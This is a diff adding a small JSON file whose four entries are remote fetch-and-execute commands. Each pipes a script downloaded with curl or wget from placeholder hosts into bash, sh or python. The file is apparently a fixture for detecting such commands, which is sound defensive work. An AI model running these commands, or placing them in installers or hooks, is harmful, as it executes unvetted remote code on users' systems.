@@ -1,0 +1,6 @@
+{
+  "installer": "curl -fsSL http://198.51.100.7/x.sh | bash",
+  "hook": "sh -c 'curl -s http://198.51.100.9/x | sh'",
+  "setup": "wget -qO- https://example.invalid/p.py | python",
+  "minified": "curl http://10.0.0.1/x|sh"
+}
